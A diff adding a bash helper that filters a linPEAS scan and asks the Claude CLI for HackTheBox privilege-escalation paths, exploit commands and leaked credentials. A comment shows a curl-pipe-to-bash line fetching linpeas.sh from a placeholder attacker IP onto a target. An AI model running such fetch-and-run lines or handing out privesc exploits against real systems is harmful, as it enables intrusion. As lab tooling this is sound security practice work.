@@ -1,0 +1,48 @@
+#!/usr/bin/env bash
+# linpeas-claude — analyze an existing linpeas output file with Claude
+# Usage: linpeas-claude <path-to-linpeas-output>
+# Example: linpeas-claude ./ctfdata/loot/linpeas.txt
+#
+# To run linpeas on target and save output:
+#   curl -sL http://YOUR_IP:8080/linpeas.sh | bash > ctfdata/loot/linpeas.txt
+
+set -euo pipefail
+
+LINPEAS_FILE="${1:?Usage: linpeas-claude <path-to-linpeas-output>}"
+
+if [ ! -f "$LINPEAS_FILE" ]; then
+    echo "Error: file not found: $LINPEAS_FILE"
+    exit 1
+fi
+
+FILESIZE=$(wc -c < "$LINPEAS_FILE")
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo " linpeas-claude → $LINPEAS_FILE ($FILESIZE bytes)"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo " Sending to Claude..."
+echo ""
+
+# linpeas output can be huge — take the most important sections
+# (grep for red/yellow findings which linpeas marks with color codes or keywords)
+FILTERED=$(grep -E \
+    "99%|95%|75%|SUID|sudo|cron|password|credential|writable|PATH|capabilities|CVE|\\.sh|config" \
+    "$LINPEAS_FILE" | head -300 || true)
+
+if [ -z "$FILTERED" ]; then
+    # fallback: just take first 300 lines
+    FILTERED=$(head -300 "$LINPEAS_FILE")
+fi
+
+echo "$FILTERED" | claude "
+You are an expert penetration tester analyzing linPEAS output from a HackTheBox Linux machine.
+
+Focus ONLY on actual privesc vectors. Provide:
+1. Top 3 most likely privilege escalation paths, ordered by ease
+2. Exact commands to exploit each path
+3. Any credentials or sensitive data found
+4. SUID/SGID binaries worth investigating (cross-reference GTFOBins)
+5. Cron jobs or writable paths that could be abused
+
+Skip anything that is just informational with no exploit potential.
+Be direct — give me commands I can run immediately.
+"
